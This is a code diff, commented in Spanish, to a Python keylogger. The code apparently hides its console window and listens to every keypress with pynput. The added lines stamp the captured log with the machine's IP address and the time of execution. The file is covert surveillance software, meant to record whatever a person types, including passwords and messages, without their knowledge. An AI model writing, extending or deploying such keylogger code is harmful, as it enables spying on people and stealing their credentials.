@@ -2,6 +2,8 @@
 import win32console
 import win32gui
 import pynput.keyboard
+import socket
+from datetime import datetime
 #trabajar con palabras
 
 ventana = win32console.GetConsoleWindow()
@@ -39,6 +41,10 @@ def convertir(key):
         return key.char
     else:
         return str(key)
-
+#IP del equipo
+lista_tecla.append(socket.gethostbyname(socket.gethostname())+"\n")
+#Hora de ejecucion del programa
+lista_tecla.append(datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n"))
+#Lo que obtenemos al teclear
 with pynput.keyboard.Listener(on_press=presiona) as liste:
     liste.join()
